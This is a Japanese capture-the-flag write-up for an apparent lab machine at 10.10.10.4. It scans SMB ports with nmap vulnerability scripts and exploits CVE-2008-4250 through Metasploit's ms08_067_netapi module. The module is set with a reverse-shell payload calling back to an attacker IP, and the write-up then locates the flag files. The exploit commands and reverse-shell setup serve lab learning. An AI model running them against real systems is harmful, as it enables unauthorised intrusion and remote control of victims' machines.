# 1.Port Scan

対象マシンのポートをスキャン
`ip=10.10.10.4`

![969b3d0408e3679cdd641d4f04f282bc.png](../_resources/969b3d0408e3679cdd641d4f04f282bc.png)

スキャンすると139ポートでファイル共有サービスである「netbios-ssn」が稼働している事を確認
下記コマンドで関連した脆弱性「CVE-2008-4250」を確認
`nmap -p 139,445 --script smb-vuln* $ip`
![e89f5a902061d2d867d051eb5c1521ff.png](../_resources/e89f5a902061d2d867d051eb5c1521ff.png)
CVE-2008-4250を調べた結果Microsoft Windowsのサーバーサービスに存在する深刻なリモートコード実行の脆弱性とのこと
CVE-2008-4250で使用するMetasploitモジュールを調べた結果「ms08\_067\_netapi 」であることを確認

# 2.Exploit

Metasploit Framework を使用
`msfconsole`
![dda8211d9f70db879b6910ee56f5b2ca.png](../_resources/dda8211d9f70db879b6910ee56f5b2ca.png)

下記コマンドを使用してExploitを設定
・使用するエクスプロイトを設定
`use exploit/windows/smb/ms08_067_netapi`
・ターゲットIPを設定
`set rhosts $ip`
・ペイロードを設定
`set PAYLOAD windows/meterpreter/reverse_tcp`
・攻撃者のIPを設定
`set lohos$ip`
・targetIDを設定しシステムを選択
`set target 6`
・エクスプロイトを実行
`exploit`

use exploit/windows/smb/ms08\_067\_netapi
set rhosts 10.10.10.4
set PAYLOAD windows/shell\_reverse\_tcp
set lhost 10.10.14.16
set target 6
exploit
![995710ca38ad78b630d608772edca427.png](../_resources/995710ca38ad78b630d608772edca427.png)

# 3.Flag Get

`Wher root.txt`

![c393c7902856b6b600a69a0f0f47f730.png](../_resources/c393c7902856b6b600a69a0f0f47f730.png)
whereコマンドが使えない為問題文をヒントに捜索
`dir`
`cd Documents and Settings`
`dir`
![ae8ed31c87fa51bf5a64ad75f884d576.png](../_resources/ae8ed31c87fa51bf5a64ad75f884d576.png)
ディレクトリ「Administrator」と「john」を発見。移動した所それぞれ「user.txt」と「root.txt」を確認
`cd john`
`cd Desktop`
`dir`
![9ebce44990399803ff8b84a5d371f034.png](../_resources/9ebce44990399803ff8b84a5d371f034.png)
cd Administrator
cd Desktop
dir
![7758ee9c7885fe605c383351c4153a22.png](../_resources/7758ee9c7885fe605c383351c4153a22.png)